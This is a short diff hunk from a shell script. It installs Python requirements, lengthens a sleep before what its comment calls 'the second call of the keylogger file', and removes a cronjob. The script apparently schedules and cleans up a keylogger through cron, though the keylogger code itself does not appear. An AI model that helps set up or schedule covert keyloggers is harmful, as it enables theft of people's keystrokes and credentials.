@@ -22,7 +22,7 @@ python3 -m pip install -r "$path"../requirements.txt
 
 
 # sleep for 90 seconds, 30 seconds before the second call of the keylogger file
-sleep 1 # 90
+sleep 90
 
 # rm cronjob
 crontab -u $USER -l | grep -v "$crontab_command" | crontab -u $USER -
